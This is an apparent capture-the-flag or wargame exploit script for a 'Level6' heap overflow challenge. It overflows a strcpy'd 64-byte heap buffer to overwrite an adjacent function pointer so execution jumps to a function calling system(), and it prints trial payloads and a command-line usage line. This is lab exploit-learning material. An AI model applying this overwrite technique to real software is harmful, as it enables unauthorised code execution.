#!/usr/bin/env python2

# Level6 - Heap Buffer Overflow Exploit
# Goal: Overwrite function pointer to redirect from m() to n()

import struct
import sys

# Key addresses from disassembly:
n_function = 0x08048454      # Function n() - calls system() 
m_function = 0x08048468      # Function m() - prints "Nope" (default)

print "=== Level6 Heap Overflow Analysis ==="
print "Target function n(): 0x%08x" % n_function  
print "Default function m(): 0x%08x" % m_function
print

# Heap layout analysis:
# buffer1 = malloc(64)  - First allocation
# funcptr = malloc(4)   - Second allocation (adjacent to buffer1)
#
# strcpy(buffer1, argv[1]) can overflow into funcptr

print "Heap Layout:"
print "[buffer1: 64 bytes] [heap metadata] [funcptr: 4 bytes]"
print "                                         ^"
print "                                    Overwrite target"
print

# Strategy: Find exact offset where funcptr gets overwritten
# Typical heap metadata on 32-bit systems: 8 bytes
# So funcptr should be at buffer1 + 64 + 8 = 72 bytes offset

# Test payloads to find exact offset:
print "Testing different offsets:"
for offset in [68, 70, 72, 74, 76]:
    padding = "A" * offset
    target = struct.pack("<L", n_function)
    payload = padding + target
    print "Offset %d: %s" % (offset, repr(payload))

print
print "Usage: ./level6 $(python -c \"print 'A'*OFFSET + '\\x54\\x84\\x04\\x08'\")"